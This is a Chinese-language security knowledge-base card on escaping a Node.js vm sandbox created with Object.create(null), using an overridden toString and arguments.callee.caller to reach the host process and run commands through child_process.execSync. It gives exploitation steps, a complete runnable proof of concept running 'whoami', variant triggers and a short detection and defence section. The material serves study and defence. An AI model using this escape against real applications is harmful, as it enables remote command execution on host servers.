---
id: binary-pwn-sandbox-escape-nodejs-vm-object-create-null-callee-caller
title: Node.js vm 的 Object.create(null) 上下文逃逸：arguments.callee.caller 取宿主调用者 + 宿主触发 toString
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: nodejs-vm-object-create-null-callee-caller-escape
aliases:
- Object.create(null) 沙箱逃逸
- arguments.callee.caller 逃逸
- vm 无 constructor 逃逸
- toString 被宿主触发逃逸
- callee.caller 取外部函数
tags:
- javascript
- nodejs
- vm
- sandbox-escape
- arguments-callee-caller
- object-create-null
- tostring
- child-process
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V291
  verified_at: '2026-11-08T08:23:19+08:00'
  notes: 已对照原文与16张图核对：Object.create(null)上下文、arguments.callee.caller、宿主console.log字符串拼接触发toString、process.mainModule.require(child_process).execSync均与原文一致；图15为Hello p4tt0n\gyh13运行结果；未本机执行。
---

## 一句话结论

当 Node.js `vm` 沙箱用 `Object.create(null)` 作为上下文、沙箱内 `this` 没有 `constructor` 可爬时，只要沙箱内定义的函数会被宿主代码调用（例如宿主执行 `'Hello ' + res` 触发 `res.toString`），该函数里的 `arguments.callee.caller` 就指向宿主 realm 的调用者；用 `caller.constructor.constructor('return process')()` 取回宿主 `process`，再 `process.mainModule.require('child_process').execSync()` 即可执行系统命令，完成逃逸。

## 原理

- `Object.create(null)` 创建的对象没有原型链，沙箱里的 `this.constructor` 是 `undefined`，经典的 `this.constructor.constructor` 链在此断开，这是题目/应用常见的“加固”写法。
- 非严格模式下，函数内部 `arguments.callee` 是当前函数本身，`arguments.callee.caller` 是调用当前函数的函数。如果当前函数是由宿主代码调用的，`caller` 就是宿主 realm 的函数对象，而不是沙箱内的函数。
- 宿主函数的 `constructor` 是宿主 `Function`；`Function('return process')()` 在宿主 realm 求值，返回宿主进程的 `process` 对象。沙箱全局没有 `process`/`require`，但这一步绕过了该限制。
- `process.mainModule` 指向 CommonJS 主模块，`process.mainModule.require('child_process')` 等价于 `Module._load`，`execSync(cmd)` 同步执行命令并返回 stdout。
- 触发点在于“宿主对沙箱对象做隐式操作”：沙箱返回对象 `a` 并重写 `a.toString`，宿主用字符串拼接 `'Hello ' + res` 时会在宿主栈帧里调用 `res.toString()`，因此 `toString` 内的 `caller` 是宿主函数。类似的隐式触发还有 `valueOf`（数值运算）、`toJSON`（JSON.stringify）、`Symbol.toPrimitive`（类型转换）。
- 该技巧依赖非严格模式：严格模式下访问 `arguments.callee` 会抛 `TypeError`；沙箱脚本若带 `"use strict"` 则失效。

## 触发条件

- 应用用 `vm.createContext(Object.create(null))` 或等价的“无原型”对象创建沙箱，使沙箱内无法直接走 `this.constructor.constructor`。
- 沙箱内定义的函数/方法会被宿主代码调用：最常见的是宿主 `console.log('Hello ' + res)`、模板字符串拼接、`String(res)`、JSON 序列化等隐式转换。
- 沙箱脚本运行在非严格模式（无 `"use strict"`），且未禁用 `arguments.callee`/`caller`。
- 应用把 `vm.runInContext` 的返回值直接用于宿主侧字符串操作，未做代理/深拷贝隔离。
- Node.js 入口为 CommonJS，`process.mainModule` 可用（ESM 或新版本可能为 undefined，可改用 `process.binding`/`module.constructor._load` 等）。

## 利用步骤

1. 确认沙箱上下文是 `Object.create(null)`（源码或报错信息中 `this.constructor` 为 undefined）。
2. 在沙箱脚本中创建对象并重写 `toString`，在 `toString` 内取 `arguments.callee.caller`。
3. 由 `caller.constructor.constructor('return process')()` 取宿主 `process`。
4. 用 `process.mainModule.require('child_process').execSync('whoami')` 执行命令并把结果作为字符串返回。
5. 沙箱返回该对象；宿主对返回值做字符串拼接/打印时触发 `toString`，命令在宿主进程内执行，结果随输出回显。

## PoC

```javascript
const vm = require('vm');
const script =
`(() => {
    const a = {}
    a.toString = function () {
      const cc = arguments.callee.caller;
      const p = (cc.constructor.constructor('return process'))();
      return p.mainModule.require('child_process').execSync('whoami').toString()
    }
    return a
  })()`;

const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log('Hello ' + res)   // 宿主拼接触发 toString -> 执行 whoami
```

输出形如 `Hello p4tt0n\gyh13`，说明命令在宿主进程执行。

## 变体与关联

- 变体：用 `valueOf` + 数值运算、`toJSON` + `JSON.stringify`、`Symbol.toPrimitive` + 类型转换等其它隐式调用点触发；只要宿主会调用沙箱对象的某个方法，就能拿到宿主 caller。
- 变体：若沙箱禁用了 `arguments.callee`，可改用 `Error.prepareStackTrace`/`CallSite` 或宿主回调参数里的函数对象做跨 realm 跳板。
- 关联：[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]] 是同一原生 vm 在“有原型”上下文下的 `this.constructor.constructor` 逃逸；本卡针对 `Object.create(null)` 的加固场景。
- 关联：[[binary-pwn-sandbox-escape-vm2-2021-23449-dynamic-import-host-module]] 是 vm2 包装层的逃逸，机制不同。

## 检测与防御

- 检测：沙箱脚本是否访问 `arguments.callee`/`caller`；`Object.create(null)` 沙箱的返回值是否被宿主直接拼接/打印；宿主是否把可调用对象暴露给沙箱。
- 防御：不要用 `vm` 执行不可信代码；使用 `isolated-vm`、独立 worker/子进程并限制权限；对返回对象做深拷贝/代理并剥离方法；沙箱脚本强制严格模式只能提高门槛，不能作为安全边界。
